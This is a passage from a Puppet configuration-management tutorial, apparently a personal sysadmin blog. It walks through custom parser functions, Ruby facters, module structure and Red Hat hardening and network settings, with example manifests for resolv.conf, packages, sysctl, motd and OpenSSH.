details.\nDynamic Information linkIt’s possible to use server-side scripts and retrieve their content in a variable. Here’s an example:\n#!/usr/bin/ruby require 'open-uri' page = open(\"http://www.puppetlabs.com/misc/download-options/\").read print page.match(/stable version is ([\\d\\.]*)/)[1] And in the manifest:\n$latestversion = generate(\"/usr/bin/latest_puppet_version.rb\") notify { \"The latest stable Puppet version is ${latestversion}. You're using ${puppetversion}.\": } Magical, isn’t it? :-). Know that it’s even possible to pass arguments with a comma between each one!!!\nParsers linkParsers are the creation of special functions usable in manifests (server-side). For example, I created a parser that will allow me to do a reverse DNS lookup:\n# Dns2IP for Puppet # Made by Pierre Mavro # Does a DNS lookup and returns an array of strings of the results # Usage : need to send one string dns servers separated by comma. The return will be the same require 'resolv' module Puppet::Parser::Functions newfunction(:dns2ip, :type =\u003e :rvalue) do |arguments| result = [ ] # Split comma sperated list in array dns_array = arguments[0].split(',') # Push each DNS/IP address in result array dns_array.each do |dns_name| result.push(Resolv.new.getaddresses(dns_name)) end # Join array with comma dns_list = result.join(',') # Delete last comma if exist good_dns_list = dns_list.gsub(/,$/, '') return good_dns_list end end We’ll be able to create this variable and then insert it into our manifests:\n$comma_ldap_servers = 'ldap1.deimos.fr,ldap2.deimos.fr,127.0.0.1' $ip_ldap_servers = dns2ip(\"${comma_ldap_servers}\") Here I send a list of LDAP servers and their IP addresses will be returned to me. Now you understand that it’s a call, a bit like inline_templates, but much more powerful.\ninfo I’ve noticed a rather annoying cache behavior with this type of function! Indeed, when you develop a parser and test it, you are likely to use ‘Notify’ functions in your manifests for debugging. However, the changes you make to your parser won’t necessarily apply until you’ve cleared the caches. After some research and IRC queries, it turns out that the only working method is to restart the Puppet Master and the web server (Nginx in our case). It works very well, but it’s a bit annoying during the debug phase. Ruby in your manifests linkIt’s entirely possible to write Ruby in your manifests. See for yourself:\nnotice( \"I am running on node %s\" % scope.lookupvar(\"fqdn\") ) This looks a lot like sprintf.\nAdding a Ruby variable in manifests linkIf we want to retrieve the current time in a manifest, for example:\nrequire 'time' scope.setvar(\"now\", Time.now) notice( \"Here is the current time : %s\" % scope.lookupvar(\"now\") ) Classes linkYou can use classes with arguments like this:\nclass mysql( $package, $socket, $port = \"3306\" ) { … } class { \"mysql\": package =\u003e \"percona-sql-server-5.0\", socket =\u003e \"/var/run/mysqld/mysqld.sock\", port =\u003e \"3306\", } Using hash tables linkJust like arrays, it’s also possible to use hash tables, look at this example:\n$interface = { name =\u003e 'eth0', address =\u003e '192.168.0.1' } notice(\"Interface ${interface[name]} has address ${interface[address]}\") Regex linkIt’s possible to use regex and retrieve patterns:\n$input = \"What a great tool\" if $input =~ /What a (\\w+) tool/ { notice(\"You said the tool is : '$1'. The complete line is : $0\") } Substitution linkSubstitution is possible:\n$ipaddress = '192.168.0.15' $class_c = regsubst($ipaddress, \"(.*)\\\\..*\", \"\\\\1.0\") notify { $ipaddress: } notify { $class_c: } This will give me 192.168.0.15 and 192.168.0.0.\nNotify and Require linkThese two functions are very useful once inserted into a manifest. This allows, for example, a service to say that it requires (require) a Package to function and a configuration file to notify (notify) a service if it changes so that it restarts the daemon. You can also write something like this:\nPackage[\"ntp\"] -\u003e File[\"/etc/ntp.conf\"] ~\u003e Service[\"ntp\"] -\u003e: means ‘require’ ~\u003e: means ’notify’ It’s also possible to do requires on classes :-)\nThe +\u003e operator linkHere’s a great operator that will save us some time. The example below:\nfile { \"/etc/ssl/certs/cookbook.pem\": source =\u003e \"puppet:///modules/apache/deimos.pem\", } Service[\"apache2\"] { require +\u003e File[\"/etc/ssl/certs/deimos.pem\"], } Corresponds to:\nservice { \"apache2\": enable =\u003e true, ensure =\u003e running, require =\u003e File[\"/etc/ssl/certs/deimos.pem\"], } Checking software version number linkIf you need to check the version number of a software to make a decision, here’s a good example:\n$app_version = \"2.7.16\" $min_version = \"2.7.18\" if versioncmp( $app_version, $min_version ) \u003e= 0 { notify { \"Puppet version OK\": } } else { notify { \"Puppet upgrade needed\": } } Virtual resources linkUseful for test writings, you can, for example, create a resource by preceding it with an ‘@’. It will be read but not executed until you explicitly tell it to (realize). Example:\n@package { 'postfix': ensure =\u003e installed } realize( Package[''postfix] ) One of the big advantages of this method is that you can declare the realize in several places in your puppet master without having conflicts!\nAdvanced file deletion linkYou can request the deletion of a file after a given time or from a certain size:\ntidy { \"/var/lib/puppet/reports\": age =\u003e \"1w\", size =\u003e \"512k\", recurse =\u003e true, } This will cause the deletion of a folder after a week with its content.\nModules linkIt’s recommended to create modules for each service to make the configuration more flexible. This is part of certain best practices.\nI’ll cover different techniques here trying to keep an increasing order of difficulty.\nInitializing a module linkSo we’ll create the appropriate directory structure on the server. For this example, we’ll start with “sudo”, but you can choose something else if you want:\nmkdir -p /etc/puppet/modules/sudo/manifests touch /etc/puppet/modules/sudo/manifests/init.pp Note that this is necessary for each module. The init.pp file is the first file that will load when the module is called.\nThe initial module (base) linkWe need to create an initial module that will manage the list of servers, the functions we’ll need, the roles, global variables… in short, it may seem a bit abstract at first but just know that we need a module to then manage all the others. We’ll start with this one which is one of the most important for the future.\nAs you now know, we need an init.pp file for the first module to be loaded. So we’ll create our directory structure which we’ll call “base”:\nmkdir -p /etc/puppet/modules/base/{manifests,puppet/parser/functions} init.pp linkThen we’ll create and fill the init.pp file:\n################################################################################ # BASE MODULES # ################################################################################ # Load defaults vars import \"vars.pp\" # Load functions import \"functions.pp\" # Load sysctl module include \"sysctl\" # Load network module include \"network\" # Load roles import \"roles.pp\" # Set servers properties import \"servers.pp\" The lines corresponding to import are equivalent to an “include” (in services like ssh or nrpe) of my other .pp files that we’ll create later. While the includes will load other modules that I’ll create later.\nvars.pp linkWe’ll then create the vars.pp file which will contain all my global variables for my future modules or manifests (*.pp):\n################################################################################ # VARS # ################################################################################ # Default admins emails $root_email = 'xxx@mycompany.com' # NTP Timezone. Usage : # Look at /usr/share/zoneinfo/ and add the continent folder followed by the town $set_timezone = 'Europe/Paris' # Define empty exclude modules $exclude_modules = [ ] # Default LDAP servers $ldap_servers = [ ] # Default DNS servers $dns_servers = [ '192.168.0.69', '192.168.0.27' ] functions.pp linkNow, we’ll create functions that will allow us to add some features not currently present in puppet or simplify some:\n/* Puppet Functions Made by Pierre Mavro */ ################################################################################ # GLOBAL FUNCTIONS # ################################################################################ # Load or not modules (include/exclude) define include_modules () { if ($exclude_modules == undef) or !($name in $exclude_modules) { include $name } } # Validate that pacakges are installed define packages_install () { notice(\"Installation of ${name} package\") package { \"${name}\": ensure =\u003e present } } # Check that those services are enabled on boot or not define services_start_on_boot ($enable_status) { service { \"${name}\": enable =\u003e \"${enable_status}\" } } # Add, remove, comment or uncomment lines define line ($file, $line, $ensure = 'present') { case $ensure { default : { err(\"unknown ensure value ${ensure}\") } present : { exec { \"echo '${line}' \u003e\u003e '${file}'\" : unless =\u003e \"grep -qFx '${line}' '${file}'\", logoutput =\u003e true } } absent : { exec { \"grep -vFx '${line}' '${file}' | tee '${file}' \u003e /dev/null 2\u003e\u00261\" : onlyif =\u003e \"grep -qFx '${line}' '${file}'\", logoutput =\u003e true } } uncomment : { exec { \"sed -i -e'/${line}/s/#\\+//' '${file}'\" : onlyif =\u003e \"test `grep '${line}' '${file}' | grep '^#' | wc -l` -ne 0\", logoutput =\u003e true } } comment : { exec { \"/bin/sed -i -e'/${line}/s/\\(.\\+\\)$/#\\1/' '${file}'\" : onlyif =\u003e \"test `grep '${line}' '${file}' | grep -v '^#' | wc -l` -ne 0\", logoutput =\u003e true } } # Use this resource instead if your platform's grep doesn't support -vFx; # note that this command has been known to have problems with lines containing quotes. # exec { \"/usr/bin/perl -ni -e 'print unless /^\\Q${line}\\E$/' '${file}'\": # onlyif =\u003e \"grep -qFx '${line}' '${file}'\" # } } } # Validate that softwares are installed define comment_lines ($filename) { line { \"${name}\" : file =\u003e \"${filename}\", line =\u003e \"${name}\", ensure =\u003e comment } } # Sysctl managment class sysctl { define conf ($value) { # $name is provided by define invocation # guid of this entry $key = $name $context = \"/files/etc/sysctl.conf\" augeas { \"sysctl_conf/$key\" : context =\u003e \"$context\", onlyif =\u003e \"get $key != '$value'\", changes =\u003e \"set $key '$value'\", notify =\u003e Exec[\"sysctl\"], } } file { \"sysctl_conf\" : name =\u003e $::operatingsystem ? { default =\u003e \"/etc/sysctl.conf\", }, } exec { \"sysctl -p\" : alias =\u003e \"sysctl\", refreshonly =\u003e true, subscribe =\u003e File[\"sysctl_conf\"], } } # Function to add ssh public keys define ssh_add_key ($user, $key) { # Create users home directory if absent exec { \"mkhomedir_${name}\" : path =\u003e \"/bin:/usr/bin\", command =\u003e \"cp -Rfp /etc/skel ~$user; chown -Rf $user:group ~$user\", onlyif =\u003e \"test `ls ~$user 2\u003e\u00261 \u003e/dev/null | wc -l` -ne 0\" } ssh_authorized_key { \"${name}\" : ensure =\u003e present, key =\u003e \"$key\", type =\u003e 'ssh-rsa', user =\u003e \"$user\", require =\u003e Exec[\"mkhomedir_${name}\"] } } # Limits.conf managment define limits_conf ($domain = \"root\", $type = \"soft\",$item = \"nofile\",\t$value = \"10000\") { # guid of this entry $key = \"$domain/$type/$item\" # augtool\u003e match /files/etc/security/limits.conf/domain[.=\"root\"][./type=\"hard\" and ./item=\"nofile\" and ./value=\"10000\"] $context = \"/files/etc/security/limits.conf\" $path_list = \"domain[.=\\\"$domain\\\"][./type=\\\"$type\\\" and ./item=\\\"$item\\\"]\" $path_exact = \"domain[.=\\\"$domain\\\"][./type=\\\"$type\\\" and ./item=\\\"$item\\\" and ./value=\\\"$value\\\"]\" augeas { \"limits_conf/$key\" : context =\u003e \"$context\", onlyif =\u003e \"match $path_exact size==0\", changes =\u003e [ # remove all matching to the $domain, $type, $item, for any $value \"rm $path_list\", # insert new node at the end of tree \"set domain[last()+1] $domain\", # assign values to the new node \"set domain[last()]/type $type\", \"set domain[last()]/item $item\", \"set domain[last()]/value $value\",], } } So we have:\nLine 10: The ability to load or not load modules via an array sent as a function argument (as described earlier in this documentation) Line 17: The ability to verify that packages are installed on the machine Line 26: The ability to verify that services are correctly loaded at machine boot Line 34: The ability to ensure that a line in a file is present, absent, commented, or not commented Line 78: The ability to comment multiple lines via an array sent as a function argument Line 88: The ability to manage the sysctl.conf file Line 117: The ability to easily deploy SSH public keys Line 128: The ability to simply manage the limits.conf file All these functions are of course not mandatory but greatly help with the use of puppet.\nroles.pp linkThen we have a file containing the roles of the servers. See it as groups to which we’ll subscribe the servers:\n################################################################################ # ROLES # ################################################################################ # Level 1 : Minimal class base::minimal { # Load modules $minimal_modules = [ 'stdlib', 'puppet', 'resolvconf', 'packages_defaults', 'configurations_defaults', 'openssh', 'selinux', 'grub', 'kdump', 'tools', 'timezone', 'ntp', 'mysecureshell', 'openldap', 'acl', 'sudo', 'snmpd', 'postfix', 'nrpe' ] include_modules{ $minimal_modules: } } # Level 2 : Cluster class base::cluster inherits minimal { # Load modules $cluster_modules = [ 'packages_cluster', 'configurations_cluster' ] include_modules{ $cluster_modules: } } # Level 2 : Low Latency class base::low_latency inherits minimal { # Load modules $lowlatency_modules = [ 'low_latency' ] include_modules{ $lowlatency_modules: } } # Level 3 : Low Latency + Cluster class base::low_latency_cluster inherits minimal { include base::cluster include base::low_latency } I’ve defined classes here that inherit from each other to varying degrees. It’s actually defined by levels. Level 3 depends on 2 and 1, 2 depends on 1, and 1 has no dependencies. This gives me a certain flexibility. For example, I know that if I load my cluster class, my minimal class will also be loaded. You’ll notice the ‘base::minimal’ annotation. It’s recommended to load your classes by calling the module, followed by ‘::’. This makes it much easier to read the manifests.\nservers.pp linkAnd finally, I have a file where I make my server declaration:\n/*############################################################################## # SERVERS # ################################################################################ == Automated Dependancies Roles == * cluster -\u003e minimal * low_latency -\u003e minimal * low_latency_cluster -\u003e low_latency + cluster + minimal == Template for servers == node /regex/ { #$exclude_modules = [ ] #$ldap_servers = 'x.x.x.x' #$set_timezone = 'Europe/Paris' #$dns_servers = [ ] #include base::minimal #include base::cluster #include base::low_latency #include base::low_latency_cluster } ##############################################################################*/ # One server node 'srv1.deimos.fr' { $ldap_servers = [ '127.0.0.1' ] include base::minimal } # Multiple servers node 'srv2.deimos.fr' 'srv3.deimos.fr' { $ldap_servers = [ '127.0.0.1' ] include base::minimal } # Multiple regex based servers node /srv-prd-\\d+/ { include base::minimal include base::low_latency $set_timezone = 'Europe/London' } Here I’ve put a server as an example or a regex for multiple servers. For info, the configuration can be integrated into LDAP.\nParser linkLet’s create the necessary directory structure:\nmkdir -p /etc/puppet/modules/base/puppet/parser/functions Then add an empty parser that will allow us to detect if an array/variable is empty or not:\n# # empty.rb # # Copyright 2011 Puppet Labs Inc. # Copyright 2011 Krzysztof Wilczynski # # Licensed under the Apache License, Version 2.0 (the \"License\"); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \"AS IS\" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # module Puppet::Parser::Functions newfunction(:empty, :type =\u003e :rvalue, :doc =\u003e \u003c\u003c-EOS Returns true if given array type or hash type has no elements or when a string value is empty and false otherwise. Prototype: empty(x) Where x is either an array, a hash or a string value. For example: Given the following statements: $a = '' $b = 'abc' $c = [] $d = ['d', 'e', 'f'] $e = {} $f = { 'x' =\u003e 1, 'y' =\u003e 2, 'z' =\u003e 3 } notice empty($a) notice empty($b) notice empty($c) notice empty($d) notice empty($e) notice empty($f) The result will be as follows: notice: Scope(Class[main]): true notice: Scope(Class[main]): false notice: Scope(Class[main]): true notice: Scope(Class[main]): false notice: Scope(Class[main]): true notice: Scope(Class[main]): false EOS ) do |*arguments| # # This is to ensure that whenever we call this function from within # the Puppet manifest or alternatively form a template it will always # do the right thing ... # arguments = arguments.shift if arguments.first.is_a?(Array) raise Puppet::ParseError, \"empty(): Wrong number of arguments \" + \"given (#{arguments.size} for 1)\" if arguments.size \u003c 1 value = arguments.shift unless [Array, Hash, String].include?(value.class) raise Puppet::ParseError, 'empty(): Requires either array, hash ' + 'or string type to work with' end value.empty? end end # vim: set ts=2 sw=2 et : # encoding: utf-8 Module Examples linkstdlib linkThis stdlib module is not essential, but it’s useful if you’re missing features in Puppet. Indeed, it brings a fairly large set of functions:\nabs\tensure_resource\tinclude\tloadyaml\treverse\tto_bytes bool2num\terr\tinfo\tlstrip\trstrip\ttype capitalize\textlookup\tinline_template md5\tsearch\tunique chomp\tfail\tis_array\tmember\tsha1\tupcase chop\tfile\tis_domain_name merge\tshellquote\tvalidate_absolute_pa create_resources flatten\tis_float\tnotice\tsize\tvalidate_array crit\tfqdn_rand\tis_hash\tnum2bool\tsort\tvalidate_bool debug\tfqdn_rotate\tis_integer\tparsejson\tsqueeze\tvalidate_hash defined\tgenerate\tis_ip_address\tparseyaml\tstr2bool\tvalidate_re defined_with_params get_module_path\tis_mac_address prefix\tstr2saltedsha512\tvalidate_slength delete\tgetvar\tis_numeric\trange\tstrftime\tvalidate_string delete_at\tgrep\tis_string\trealize\tstrip\tvalues downcase\thas_key\tjoin\tregsubst\tswapcase\tvalues_at emerg\thash\tkeys\trequire\ttime\tzip empty First create the directory structure:\nmkdir -p /etc/puppet/modules/stdlib Download the latest version and simply decompress it:\ncd /etc/puppet/modules/stdlib wget http://forge.puppetlabs.com/puppetlabs/stdlib/3.2.0.tar.gz tar -xzf 3.2.0.tar.gz mv puppetlabs-stdlib-3.2.0/stdlib stdlib rm -f 3.2.0.tar.gz Puppet linkThis one is quite funny because it’s simply the configuration of the Puppet client. However, it can be very useful for managing its own updates. So let’s create the directory structures:\nmkdir -p /etc/puppet/modules/puppet/{manifests,files} init.pp linkWe create the init.pp module here that will allow us to choose the file to load according to the OS.\n/* Puppet Module for Puppet Made by Pierre Mavro */ class puppet { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include ::puppet::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp link /* Puppet Module for Puppet Made by Pierre Mavro */ class puppet::redhat { # Change default configuration file { '/etc/puppet/puppet.conf' : ensure =\u003e present, source =\u003e \"puppet:///modules/puppet/${::osfamily}.puppet.conf\", mode =\u003e 644, owner =\u003e root, group =\u003e root } # Disable service on boot and be sure it is not started service { 'puppet-srv' : name =\u003e 'puppet', # Let this line commented if you're using Puppet Dashboard #ensure =\u003e stopped, enable =\u003e false } } On line 9, we use a variable available in the facts (client-side) so that depending on the response, we load a file associated with the OS. So we’ll have a configuration file accessible via Puppet in the form ‘RedHat.puppet.conf’. Then, for the service, we make sure it’s properly stopped at startup and that it’s in an off state for now. In fact, I don’t want it to trigger and synchronize every 30 minutes (default value), I find it too dangerous and prefer to decide via other mechanisms (SSH, Mcollective…) when I want a synchronization to be done.\nfiles linkIn files, we’ll have the basic configuration file that should apply to all RedHat type machines:\n[main] # The Puppet log directory. # The default value is '$vardir/log'. logdir = /var/log/puppet # Where Puppet PID files are kept. # The default value is '$vardir/run'. rundir = /var/run/puppet # Where SSL certificates are kept. # The default value is '$confdir/ssl'. ssldir = $vardir/ssl # Puppet master server server = puppet-prd.deimos.fr # Add custom facts pluginsync = true pluginsource = puppet://$server/plugins factpath = /var/lib/puppet/lib/facter [agent] # The file in which puppetd stores a list of the classes # associated with the retrieved configuratiion. Can be loaded in # the separate ``puppet`` executable using the ``--loadclasses`` # option. # The default value is '$confdir/classes.txt'. classfile = $vardir/classes.txt # Where puppetd caches the local configuration. An # extension indicating the cache format is added automatically. # The default value is '$confdir/localconfig'. localconfig = $vardir/localconfig # Reporting report = true # Inspect reports for a compliance workflow archive_files = true resolvconf linkI made this module to manage the resolv.conf configuration file. The usage is quite simple, it will retrieve the information of the DNS servers filled in the array available in vars.pp of the base module. So fill in the default DNS servers:\n# Default DNS servers $dns_servers = [ '192.168.0.69', '192.168.0.27' ] You can override these values directly at the level of one or more nodes if you need to have specific configurations for certain nodes (in the servers.pp file of the base module):\n# One server node 'srv.deimos.fr' { $dns_servers = [ '127.0.0.1' ] include base::minimal } Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/resolvconf/{manifests,templates} init.pp link /* Resolv.conf Module for Puppet Made by Pierre Mavro */ class resolvconf { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include resolvconf::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkHere’s the configuration for Red Hat, I use a template file here, which will be filled with the information present in the $dns_servers array:\n/* Resolvconf Module for Puppet Made by Pierre Mavro */ class resolvconf::redhat { # resolv.conf file file { \"/etc/resolv.conf\" : content =\u003e template(\"resolvconf/resolv.conf\"), mode =\u003e 744, owner =\u003e root, group =\u003e root } } templates linkAnd finally my resolv.conf template file:\n# Generated by Puppet domain deimos.fr search deimos.fr deimos.lan \u003c% dns_servers.each do |dnsval| -%\u003e nameserver \u003c%= dnsval %\u003e \u003c% end -%\u003e Here we have a ruby loop that will go through the $dns_servers array and build the resolv.conf file by inserting line by line ’nameserver’ with the associated server.\nPuppet: Configuration File Management Solution linkpackages_defaults linkI use this module to install or uninstall packages that I absolutely need on all my machines. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/packages_defaults/manifests init.pp link class packages_defaults { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include ::packages_defaults::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkI could have grouped everything into a single block, but for the sake of readability on the packages included in the distribution and those I added in a custom repository, I preferred to make a separation:\n# Red Hat Defaults packages class packages_defaults::redhat { # Set all default packages (embended in distribution) that need to be installed packages_install { [ 'nc', 'tree', 'telnet', 'dialog', 'freeipmi', 'glibc-2.12-1.80.el6.i686' ]: } # Set all custom packages (not embended in distribution) that need to be installed packages_install { [ 'puppet', 'tmux' ]: } } configurations_defaults linkThis module, like the previous one, is used for the configuration of the OS delivered as standard. I actually want to make adjustments to parts of the pure system here, without really getting into a particular software. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/configuration_defaults/{manifests,templates,lib/facter} init.pp link class configurations_defaults { import '*.pp' # Configure common security parameters include configurations_defaults::common # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include configurations_defaults::redhat } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } Here I load all .pp files at startup, then call and import common configurations (common), then apply configurations specific to each OS.\ncommon.pp linkHere I want to have the same base motd file for all my machines. You’ll see later why it appears as a template:\nclass configurations_defaults::common { # Motd banner for all servers file { '/etc/motd': ensure =\u003e present, content =\u003e template(\"configurations_defaults/motd\"), mode =\u003e 644, owner =\u003e root, group =\u003e root } } redhat.pp linkI will load security options here, automatically configure bonding on my machines, and a sysctl option:\nclass configurations_defaults::redhat { # Security configurations include 'configurations_defaults::redhat::security' # Configure bonding include 'configurations_defaults::redhat::network' # Set sysctl options sysctl::conf { 'vm.swappiness': value =\u003e '0'; } } security.pp linkYou’ll see that this file does quite a lot:\nclass configurations_defaults::redhat::security inherits configurations_defaults::redhat { # Manage Root passwords $sha512_passwd='$6$lhkAz...' $md5_passwd='$1$Fcwy...' if ($::passwd_algorithm == sha512) { # sha512 root password $root_password=\"$sha512_passwd\" } else { # MD5 root password $root_password=\"$md5_passwd\" } user { 'root': ensure =\u003e present, password =\u003e \"$root_password\" } # Enable auditd service service { \"auditd\" : enable =\u003e true, ensure =\u003e 'running', } # Comment unwanted sysctl lines $sysctl_file = '/etc/sysctl.conf' $sysctl_comment_lines = [ \"net.bridge.bridge-nf-call-ip6tables\", \"net.bridge.bridge-nf-call-iptables\", \"net.bridge.bridge-nf-call-arptables\" ] comment_lines { $sysctl_comment_lines : filename =\u003e \"$sysctl_file\" } # Add security sysctl values sysctl::conf { 'vm.mmap_min_addr': value =\u003e '65536'; 'kernel.modprobe': value =\u003e '/bin/false'; 'kernel.kptr_restrict': value =\u003e '1'; 'net.ipv6.conf.all.disable_ipv6': value =\u003e '1'; } # Deny kernel read to others users case $::kernel_security_rights { '0': { exec {'chmod_kernel': command =\u003e 'chmod o-r /boot/{vmlinuz,System.map}-*' } } '1' : { notice(\"Kernel files have security rights\") } } # Change opened file descriptor value and avoid fork bomb by limiting number of process limits_conf { \"open_fd\": domain =\u003e '*', type =\u003e '-', item =\u003e nofile, value =\u003e 2048; \"fork_bomb_soft\": domain =\u003e '@users', type =\u003e soft, item =\u003e nproc, value =\u003e 200; \"fork_bomb_hard\": domain =\u003e '@users', type =\u003e hard, item =\u003e nproc, value =\u003e 300; } } Some explanations are needed:\nManage Root passwords: We define the desired root password in md5 and sha1 form. Depending on what’s configured on the machine, it will configure the desired password. For this detection I use a facter (passwd_algorithm.rb) Enable auditd service: we make sure that the auditd service will start at boot and is currently running Comment unwanted sysctl lines: we ask that certain lines present in sysctl be commented if they exist Add security sysctl values: we add sysctl rules, and assign them a value Deny kernel read to others users: I created a facter here, which checks the rights of kernel files (kernel_rights.rb) Change opened file descriptor value: allows to use the limits_conf function to manage the limits.conf file. Here I’ve changed the default value of file descriptors and added a small security to avoid fork bombs. facter linkWe’ll insert here the facters that will be used for certain functions requested above.\npasswd_algorithm.rb linkThis facter will determine the algorithm used for authentication:\n# Get Passwd Algorithm Facter.add(\"passwd_algorithm\") do setcode do Facter::Util::Resolution.exec(\"grep ^PASSWDALGORITHM /etc/sysconfig/authconfig | awk -F'=' '{ print $2 }'\") end end kernel_rights.rb linkThis facter will determine if any user has the right to read the kernels installed on the current machine:\n# Get security rights Facter.add(:kernel_security_rights) do # Get kernel files where rights will be checked kernel_files = Dir.glob(\"/boot/{vmlinuz,System.map}-*\") current_rights=1 # Check each files kernel_files.each do |file| # Get file mode full_rights = sprintf(\"%o\", File.stat(file).mode) # Get last number (correponding to other rights) other_rights = Integer(full_rights) % 10 # Check if other got read rights if other_rights \u003e= 4 current_rights=0 end end setcode do # Set kernel_security_rights to 1 if read value is detected current_rights end end get_network_infos.rb linkThis facter allows to retrieve the current ip on eth0, the netmask and the gateway:\n# Get public IP address Facter.add(:public_ip) do setcode do # Get bond0 ip if exist if File.exist? \"/proc/sys/net/ipv4/conf/bond0\" Facter::Util::Resolution.exec(\"ip addr show dev bond0 | awk '/inet/{print $2}' | head -1 | sed 's/\\\\/.*//'\") else # Or eth0 ip if exist if File.exist? \"/proc/sys/net/ipv4/conf/eth0\" Facter::Util::Resolution.exec(\"ip addr show dev eth0 | awk '/inet/{print $2}' | head -1 | sed 's/\\\\/.*//'\") else # Else return error 'unknow (puppet issue)' end end end end # Get netmask on the fist interface Facter.add(:public_netmask) do setcode do # Get bond0 netmask if exist if File.exist? \"/proc/sys/net/ipv4/conf/bond0\" Facter::Util::Resolution.exec(\"ifconfig bond0 | awk '/inet/{print $4}' | sed 's/.*://'\") else # Or eth0 netmask if exist if File.exist? \"/proc/sys/net/ipv4/conf/eth0\" Facter::Util::Resolution.exec(\"ifconfig eth0 | awk '/inet/{print $4}' | sed 's/.*://'\") else # Else set a default netmask '255.255.255.0' end end end end # Get default gateway Facter.add(:default_gateway) do setcode do Facter::Util::Resolution.exec(\"ip route | awk '/default/{print $3}'\") end end network.pp linkHere we will load the bonding configuration and other network-related things:\nclass configurations_defaults::redhat::network inherits configurations_defaults::redhat { # Disable network interface renaming augeas { \"grub_udev_net\" : context =\u003e \"/files/etc/grub.conf\", changes =\u003e \"set title[1]/kernel/biosdevname 0\" } # Load bonding module at boot line { 'load_bonding': file =\u003e '/etc/modprobe.d/bonding.conf', line =\u003e 'alias bond0 bonding', ensure =\u003e present } # Bonded master interface - static network::bond::static { \"bond0\" : ipaddress =\u003e \"$::public_ip\", netmask =\u003e \"$::public_netmask\", gateway =\u003e \"$::default_gateway\", bonding_opts =\u003e \"mode=active-backup\", ensure =\u003e \"up\" } # Bonded slave interface - static network::bond::slave { \"eth0\" : macaddress =\u003e $::macaddress_eth0, master =\u003e \"bond0\", } # Bonded slave interface - static network::bond::slave { \"eth1\" : macaddress =\u003e $::macaddress_eth1, master =\u003e \"bond0\", } } Disable network interface renaming: we add an argument and set its value to 0 in grub so that it doesn’t rename the interfaces and leaves them as ethX. I wrote an article about this if you’re interested. Load bonding module at boot: We make sure that the bonding module will be loaded at boot time and that an alias on bond0 exists Bonded interfaces: I refer you to the bonding module available on Puppet Forge, as well as the documentation on bonding if you don’t know what it is. I also created a facter (get_network_infos.rb) for this to retrieve the public interface (eth0, on which I would connect), the netmask and gateway already present and configured on the machine templates linkWe had talked about it earlier, we manage a template for motd to display, in addition to a text, the hostname of the machine you connect to (line 16):\n================================================================================ This is an official computer system and is the property of Deimos. It is for authorized users only. Unauthorized users are prohibited. Users (authorized or unauthorized) have no explicit or implicit expectation of privacy. Any or all uses of this system may be subject to one or more of the following actions: interception, monitoring, recording, auditing, inspection and disclosing to security personnel and law enforcement personnel, as well as authorized officials of other agencies, both domestic and foreign. By using this system, the user consents to these actions. Unauthorized or improper use of this system may result in administrative disciplinary action and civil and criminal penalties. By accessing this system you indicate your awareness of and consent to these terms and conditions of use. Discontinue access immediately if you do not agree to the conditions stated in this notice. ================================================================================ \u003c%= hostname %\u003e OpenSSH - 1 linkHere’s a first example for OpenSSH. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/openssh/{manifests,templates,lib/facter} init.pp link /* OpenSSH Module for Puppet Made by Pierre Mavro */ class openssh { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include openssh::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkHere we load everything we need, then load the common because OpenSSH needs to be installed and configured before moving on to the common part:\n/* OpenSSH Module for Puppet Made by Pierre Mavro */ class openssh::redhat { # Install ssh package package { 'openssh-server' : ensure =\u003e present } # SSHd config file file { \"/etc/ssh/sshd_config\" : source =\u003e \"puppet:///modules/openssh/sshd_config.$::operatingsystem\", mode =\u003e 600, owner =\u003e root, group =\u003e root, notify =\u003e Service[\"sshd\"] } service { 'sshd' : enable =\u003e true, ensure =\u003e running, require =\u003e File['/etc/ssh/sshd_config'] } include openssh::common } In the service part, there is important information (require), which will restart the service if the configuration file changes.\ncommon.pp linkHere, we make sure that the folder where SSH keys are stored is present with the right permissions, then we call another file that will contain all the keys we want to export:\n/* OpenSSH Module for Puppet Made by Pierre Mavro */ class openssh::common { # Check that .ssh directory exist with correct rights file { \"$::home_root/.ssh\" : ensure =\u003e directory, mode =\u003e 0700, owner =\u003e root, group =\u003e root } # Load all public keys include openssh::ssh_keys } The ‘home_root’ directive is generated from a facter provided below.\nfacter linkHere’s the facter that allows you to retrieve the home of the root user:\n# Get Home directory Facter.add(\"home_root\") do setcode do Facter::Util::Resolution.exec(\"echo ~root\") end end ssh_keys.pp linkHere I add the keys, both for access from other servers or users:\n/* OpenSSH Module for Puppet Made by Pierre Mavro */ class openssh::ssh_keys inherits openssh::common { ################################### # Servers ################################### # Puppet master ssh_add_key { 'puppet_root' : user =\u003e 'root', key =\u003e 'AAAA...' } ################################### # Sys-Admins ################################### # Pierre Mavro ssh_add_key { 'pmavro_root' : user =\u003e 'root', key =\u003e 'AAAA...' } } files linkThe OpenSSH configuration file for Red Hat:\n# $OpenBSD: sshd_config,v 1.80 2008/07/02 02:24:18 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # This sshd was compiled with PATH=/usr/local/bin:/bin:/usr/bin # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options change a # default value. Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: # Disable legacy (protocol version 1) support in the server for 